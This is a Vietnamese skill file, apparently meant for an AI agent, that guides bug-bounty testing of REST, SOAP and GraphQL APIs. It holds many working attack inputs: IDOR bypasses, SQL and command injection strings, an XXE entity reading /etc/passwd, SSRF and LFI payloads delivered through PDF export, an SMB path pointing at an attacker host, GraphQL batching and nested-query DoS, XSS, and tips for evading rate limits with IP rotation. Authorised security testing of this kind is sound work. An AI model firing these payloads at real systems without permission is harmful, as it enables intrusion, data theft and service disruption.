---
name: API Fuzzing for Bug Bounty
description: Kỹ năng này nên được sử dụng khi người dùng yêu cầu "kiểm thử bảo mật API", "fuzz API", "tìm lỗ hổng IDOR", "kiểm thử REST API", "kiểm thử GraphQL", "kiểm thử thâm nhập API", "kiểm thử API săn lỗi nhận thưởng", hoặc cần hướng dẫn về các kỹ thuật đánh giá bảo mật API.
metadata:
  author: zebbern
  version: "1.1"
---

# Fuzzing API cho Săn lỗi nhận thưởng (Bug Bounty)

## Mục đích

Cung cấp các kỹ thuật toàn diện để kiểm thử REST, SOAP và GraphQL API trong quá trình săn lỗi nhận thưởng và kiểm thử thâm nhập. Bao gồm khám phá lỗ hổng, bỏ qua xác thực, khai thác IDOR và các vectơ tấn công cụ thể cho API.

## Đầu vào/Điều kiện tiên quyết

- Burp Suite hoặc công cụ proxy tương tự
- Danh sách từ API (SecLists, api_wordlist)
- Hiểu biết về các giao thức REST/GraphQL/SOAP
- Python để viết script
- Các điểm cuối API mục tiêu và tài liệu (nếu có)

## Đầu ra/Sản phẩm bàn giao

- Các lỗ hổng API được xác định
- Bằng chứng khai thác IDOR
- Các kỹ thuật bỏ qua xác thực
- Các điểm tiêm nhiễm SQL (SQL injection)
- Tài liệu truy cập dữ liệu trái phép

---

## Tổng quan về Các loại API

| Loại    | Giao thức | Định dạng Dữ liệu  | Cấu trúc                    |
| ------- | --------- | ------------------ | --------------------------- |
| SOAP    | HTTP      | XML                | Header + Body               |
| REST    | HTTP      | JSON/XML/URL       | Các điểm cuối được xác định |
| GraphQL | HTTP      | Truy vấn Tùy chỉnh | Điểm cuối duy nhất          |

---

## Quy trình làm việc cốt lõi

### Bước 1: Thăm dò API

Xác định loại API và liệt kê các điểm cuối:

```bash
# Kiểm tra tài liệu Swagger/OpenAPI
/swagger.json
/openapi.json
/api-docs
/v1/api-docs
/swagger-ui.html

# Sử dụng Kiterunner để khám phá API
kr scan https://target.com -w routes-large.kite

# Trích xuất đường dẫn từ Swagger
python3 json2paths.py swagger.json
```

### Bước 2: Kiểm thử Xác thực

```bash
# Kiểm thử các đường dẫn đăng nhập khác nhau
/api/mobile/login
/api/v3/login
/api/magic_link
/api/admin/login

# Kiểm tra giới hạn tốc độ trên các điểm cuối xác thực
# Nếu không có giới hạn tốc độ → có thể brute force

# Kiểm thử API di động và web riêng biệt
# Đừng giả định các kiểm soát bảo mật giống nhau
```

### Bước 3: Kiểm thử IDOR

Insecure Direct Object Reference (Tham chiếu Đối tượng Trực tiếp Không an toàn) là lỗ hổng API phổ biến nhất:

```bash
# IDOR cơ bản
GET /api/users/1234 → GET /api/users/1235

# Ngay cả khi ID dựa trên email, hãy thử số
/?user_id=111 thay vì /?user_id=user@mail.com

# Kiểm thử /me/orders so với /user/654321/orders
```

**Các Kỹ thuật Bỏ qua IDOR:**

```bash
# Bọc ID trong mảng
{"id":111} → {"id":[111]}

# Bọc JSON
{"id":111} → {"id":{"id":111}}

# Gửi ID hai lần
URL?id=<HỢP_LỆ>&id=<NẠN_NHÂN>

# Tiêm ký tự đại diện (Wildcard injection)
{"user_id":"*"}

# Ô nhiễm tham số (Parameter pollution)
/api/get_profile?user_id=<nạn_nhân>&user_id=<hợp_lệ>
{"user_id":<id_hợp_lệ>,"user_id":<id_nạn_nhân>}
```

### Bước 4: Kiểm thử Tiêm nhiễm (Injection Testing)

**SQL Injection trong JSON:**

```json
{"id":"56456"}                    → OK
{"id":"56456 AND 1=1#"}           → OK
{"id":"56456 AND 1=2#"}           → OK
{"id":"56456 AND 1=3#"}           → LỖI (có lỗ hổng!)
{"id":"56456 AND sleep(15)#"}     → NGỦ 15 GIÂY
```

**Command Injection:**

```bash
# Ruby on Rails
?url=Kernel#open → ?url=|ls

# Linux command injection
api.url.com/endpoint?name=file.txt;ls%20/
```

**XXE Injection:**

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

**SSRF thông qua API:**

```html
<object data="http://127.0.0.1:8443" /> <img src="http://127.0.0.1:445" />
```

**Lỗ hổng .NET Path.Combine:**

```bash
# Nếu ứng dụng .NET sử dụng Path.Combine(path_1, path_2)
# Kiểm thử đường dẫn truyền tải (path traversal)
https://example.org/download?filename=a.png
https://example.org/download?filename=C:\inetpub\wwwroot\web.config
https://example.org/download?filename=\\smb.dns.attacker.com\a.png
```

### Bước 5: Kiểm thử Phương thức

```bash
# Kiểm thử tất cả các phương thức HTTP
GET /api/v1/users/1
POST /api/v1/users/1
PUT /api/v1/users/1
DELETE /api/v1/users/1
PATCH /api/v1/users/1

# Chuyển đổi loại nội dung (content type)
Content-Type: application/json → application/xml
```

---

## Kiểm thử Cụ thể cho GraphQL

### Truy vấn Tự kiểm tra (Introspection Query)

Lấy toàn bộ lược đồ backend:

```graphql
{
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    types {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        args {
          name
          type {
            name
            kind
          }
        }
      }
    }
  }
}
```

**Phiên bản mã hóa URL:**

```
/graphql?query={__schema{types{name,kind,description,fields{name}}}}
```

### IDOR GraphQL

```graphql
# Thử truy cập ID người dùng khác
query {
  user(id: "OTHER_USER_ID") {
    email
    password
    creditCard
  }
}
```

### SQL/NoSQL Injection GraphQL

```graphql
mutation {
  login(input: { email: "test' or 1=1--", password: "password" }) {
    success
    jwt
  }
}
```

### Bỏ qua Giới hạn Tốc độ (Hàng loạt)

```graphql
mutation {
  login(input: { email: "a@example.com", password: "password" }) {
    success
    jwt
  }
}
mutation {
  login(input: { email: "b@example.com", password: "password" }) {
    success
    jwt
  }
}
mutation {
  login(input: { email: "c@example.com", password: "password" }) {
    success
    jwt
  }
}
```

### DoS GraphQL (Truy vấn Lồng nhau)

```graphql
query {
  posts {
    comments {
      user {
        posts {
          comments {
            user {
              posts { ... }
            }
          }
        }
      }
    }
  }
}
```

### XSS GraphQL

```bash
# XSS thông qua điểm cuối GraphQL
http://target.com/graphql?query={user(name:"<script>alert(1)</script>"){id}}

# XSS mã hóa URL
http://target.com/example?id=%C/script%E%Cscript%Ealert('XSS')%C/script%E
```

### Công cụ GraphQL

| Công cụ      | Mục đích                   |
| ------------ | -------------------------- |
| GraphCrawler | Khám phá lược đồ           |
| graphw00f    | Nhận dạng (Fingerprinting) |
| clairvoyance | Tái tạo lược đồ            |
| InQL         | Tiện ích mở rộng Burp      |
| GraphQLmap   | Khai thác                  |

---

## Các Kỹ thuật Bỏ qua Điểm cuối

Khi nhận được 403/401, hãy thử các cách bỏ qua này:

```bash
# Yêu cầu bị chặn ban đầu
/api/v1/users/sensitivedata → 403

# Các nỗ lực bỏ qua
/api/v1/users/sensitivedata.json
/api/v1/users/sensitivedata?
/api/v1/users/sensitivedata/
/api/v1/users/sensitivedata??
/api/v1/users/sensitivedata%20
/api/v1/users/sensitivedata%09
/api/v1/users/sensitivedata#
/api/v1/users/sensitivedata&details
/api/v1/users/..;/sensitivedata
```

---

## Khai thác Đầu ra

### Tấn công Xuất PDF

```html
<!-- LFI thông qua xuất PDF -->
<iframe src="file:///etc/passwd" height="1000" width="800">
  <!-- SSRF thông qua xuất PDF -->
  <object data="http://127.0.0.1:8443" />

  <!-- Quét cổng -->
  <img src="http://127.0.0.1:445" />

  <!-- Tiết lộ IP -->
  <img src="https://iplogger.com/yourcode.gif"
/></iframe>
```

### DoS thông qua Giới hạn

```bash
# Yêu cầu bình thường
/api/news?limit=100

# Nỗ lực DoS
/api/news?limit=9999999999
```

---

## Danh sách kiểm tra Các lỗ hổng API Phổ biến

| Lỗ hổng                         | Mô tả                                                 |
| ------------------------------- | ----------------------------------------------------- |
| Phơi bày API                    | Các điểm cuối không được bảo vệ bị lộ công khai       |
| Cấu hình Cache Sai              | Dữ liệu nhạy cảm được lưu trong cache không chính xác |
| Lộ Token                        | Khóa/token API trong phản hồi hoặc URL                |
| Điểm yếu JWT                    | Ký yếu, không hết hạn, nhầm lẫn thuật toán            |
| IDOR / BOLA                     | Ủy quyền cấp đối tượng bị hỏng                        |
| Điểm cuối Không có tài liệu     | Điểm cuối admin/debug ẩn                              |
| Phiên bản Khác nhau             | Khoảng trống bảo mật trong các phiên bản API cũ hơn   |
| Giới hạn Tốc độ                 | Thiếu hoặc có thể bỏ qua giới hạn tốc độ              |
| Điều kiện Đua (Race Conditions) | Lỗ hổng TOCTOU                                        |
| XXE Injection                   | Khai thác trình phân tích cú pháp XML                 |
| Vấn đề Loại Nội dung            | Chuyển đổi giữa JSON/XML                              |
| Giả mạo Phương thức HTTP        | Lạm dụng GET→DELETE/PUT                               |

---

## Tham khảo Nhanh

| Lỗ hổng           | Payload Kiểm thử         | Rủi ro       |
| ----------------- | ------------------------ | ------------ |
| IDOR              | Thay đổi tham số user_id | Cao          |
| SQLi              | `' OR 1=1--` trong JSON  | Nghiêm trọng |
| Command Injection | `; ls /`                 | Nghiêm trọng |
| XXE               | DOCTYPE với ENTITY       | Cao          |
| SSRF              | IP nội bộ trong tham số  | Cao          |
| Rate Limit Bypass | Yêu cầu hàng loạt        | Trung bình   |
| Method Tampering  | GET→DELETE               | Cao          |

---

## Tham khảo Công cụ

| Hạng mục       | Công cụ                  | URL                                                      |
| -------------- | ------------------------ | -------------------------------------------------------- |
| API Fuzzing    | Fuzzapi                  | github.com/Fuzzapi/fuzzapi                               |
| API Fuzzing    | API-fuzzer               | github.com/Fuzzapi/API-fuzzer                            |
| API Fuzzing    | Astra                    | github.com/flipkart-incubator/Astra                      |
| API Security   | apicheck                 | github.com/BBVA/apicheck                                 |
| API Discovery  | Kiterunner               | github.com/assetnote/kiterunner                          |
| API Discovery  | openapi_security_scanner | github.com/ngalongc/openapi_security_scanner             |
| API Toolkit    | APIKit                   | github.com/API-Security/APIKit                           |
| API Keys       | API Guesser              | api-guesser.netlify.app                                  |
| GUID           | GUID Guesser             | gist.github.com/DanaEpp/8c6803e542f094da5c4079622f9b4d18 |
| GraphQL        | InQL                     | github.com/doyensec/inql                                 |
| GraphQL        | GraphCrawler             | github.com/gsmith257-cyber/GraphCrawler                  |
| GraphQL        | graphw00f                | github.com/dolevf/graphw00f                              |
| GraphQL        | clairvoyance             | github.com/nikitastupin/clairvoyance                     |
| GraphQL        | batchql                  | github.com/assetnote/batchql                             |
| GraphQL        | graphql-cop              | github.com/dolevf/graphql-cop                            |
| Wordlists      | SecLists                 | github.com/danielmiessler/SecLists                       |
| Swagger Parser | Swagger-EZ               | rhinosecuritylabs.github.io/Swagger-EZ                   |
| Swagger Routes | swagroutes               | github.com/amalmurali47/swagroutes                       |
| API Mindmap    | MindAPI                  | dsopas.github.io/MindAPI/play                            |
| JSON Paths     | json2paths               | github.com/s0md3v/dump/tree/master/json2paths            |

---

## Các ràng buộc

**Phải:**

- Kiểm thử API di động, web và nhà phát triển riêng biệt
- Kiểm tra tất cả các phiên bản API (/v1, /v2, /v3)
- Xác thực cả truy cập đã xác thực và không xác thực

**Không được:**

- Giả định các kiểm soát bảo mật giống nhau trên các phiên bản API
- Bỏ qua việc kiểm thử các điểm cuối không có tài liệu
- Bỏ qua các kiểm tra giới hạn tốc độ

**Nên:**

- Thêm tiêu đề `X-Requested-With: XMLHttpRequest` để mô phỏng frontend
- Kiểm tra archive.org để tìm các điểm cuối API lịch sử
- Kiểm thử điều kiện đua trên các hoạt động nhạy cảm

---

## Các ví dụ

### Ví dụ 1: Khai thác IDOR

```bash
# Yêu cầu ban đầu (dữ liệu của chính mình)
GET /api/v1/invoices/12345
Authorization: Bearer <token>

# Yêu cầu đã sửa đổi (dữ liệu của người dùng khác)
GET /api/v1/invoices/12346
Authorization: Bearer <token>

# Phản hồi tiết lộ dữ liệu hóa đơn của người dùng khác
```

### Ví dụ 2: Tự kiểm tra GraphQL

```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name}}}}"}'
```

---

## Khắc phục sự cố

| Vấn đề                           | Giải pháp                                       |
| -------------------------------- | ----------------------------------------------- |
| API không trả về gì              | Thêm tiêu đề `X-Requested-With: XMLHttpRequest` |
| 401 trên tất cả các điểm cuối    | Thử thêm tham số `?user_id=1`                   |
| Tự kiểm tra GraphQL bị tắt       | Sử dụng clairvoyance để tái tạo lược đồ         |
| Bị giới hạn tốc độ               | Sử dụng xoay vòng IP hoặc yêu cầu hàng loạt     |
| Không thể tìm thấy các điểm cuối | Kiểm tra Swagger, archive.org, tệp JS           |
